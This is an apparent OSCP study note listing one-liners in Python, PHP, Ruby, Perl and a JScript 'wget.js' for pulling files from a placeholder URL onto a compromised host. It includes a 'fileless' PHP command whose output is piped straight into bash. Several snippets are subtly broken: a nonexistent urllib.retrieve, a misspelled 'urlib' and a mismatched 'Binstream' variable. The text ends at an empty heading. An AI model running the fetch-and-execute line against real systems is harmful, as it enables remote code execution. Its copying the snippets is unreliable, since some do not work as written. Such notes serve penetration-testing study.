---
permalink: oscp/techniques/file-transfer/transferring-files-with-code-1
title: Transferring Files with Code
type: note
---

## Python Downloading Files

#### Download Files with Python2
```bash
python2.7 -c 'import urllib; urllib.retrieve("<URL TO FILE>", "<FILENAME TO SAVE FILE AS>")'
```

#### Download Files with Python3
```bash
python3 -c 'import urllib.request; urlib.request.urlretrieve("<LINK TO FILE>")'
```

---
## PHP Downloading Files

#### Using `File_get_contents()` function
```bash
php -r '$file = file_get_contents("<URL TO FILE>"); file_put_contents("<FILENAME TO SAVE AS>", $file);'
```

#### Using `Fopen()` function
```bash
php -r 'const BUFFER = 1024; $fremote = fopen("<URL TO FILE>", "rb"); $flocal = fopen("<FILENAME TO SAVE AS>", "wb"); while($buffer = fread($fremote, BUFFER)) {fwrite($flocal,$buffer);} fclose($flocal); fclose($fremote);'
```

#### Fileless Download to Bash
```bash
php -r '$lines = @file("<URL TO FILE>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

---
## Other Languages

#### Ruby File Download
```bash
ruby -e 'require "net/http"; File.write("<FILENAME TO SAVE AS>", Net::HTTP.get(URI.parse("<URL TO FILE>")))'
```

#### Perl File Download
```bash
perl -e 'use LWP::Simple; getstore("<URL TO FILE>", "<Filename to save as>")'
```

---
## Javascript

#### Create a file and write code in `wget.js`
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
Binstream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

#### Download the File using `wget.js` and `csc`